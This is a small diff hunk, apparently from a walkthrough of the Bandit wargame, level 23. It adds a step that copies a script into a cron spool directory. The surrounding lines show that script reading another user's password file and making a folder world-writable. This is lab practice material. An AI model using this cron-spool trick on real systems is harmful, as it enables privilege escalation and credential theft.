@@ -431,6 +431,9 @@ cat /etc/bandit_pass/bandit24 > /tmp/meow/password
 bandit23@bandit:/tmp/meow$ chmod 777 -R /tmp/meow
 ```
 ```
+bandit23@bandit:/tmp/meow$ cp script.sh /var/spool/bandit24
+```
+```
 bandit23@bandit:/tmp/meow$ ls -l
 total 4
 -rwxrwxrwx 1 bandit23 bandit23 63 Nov  1 16:28 script.sh
